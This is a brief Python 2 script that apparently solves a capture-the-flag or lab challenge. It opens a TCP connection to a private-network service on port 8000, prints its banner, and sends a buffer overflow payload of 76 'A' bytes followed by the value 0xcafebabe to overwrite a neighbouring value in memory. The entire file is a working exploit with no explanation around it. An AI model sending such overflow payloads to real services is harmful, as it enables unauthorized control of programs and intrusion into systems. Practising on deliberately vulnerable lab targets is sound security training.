import socket

HOST = "10.103.128.155"
PORT = 8000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))

print "[*] Connected to %s:%d" % (HOST,PORT)
print sock.recv(1024)

buf = 'A' * 76 + '\xbe\xba\xfe\xca'

sock.send(buf)
print sock.recv(1024)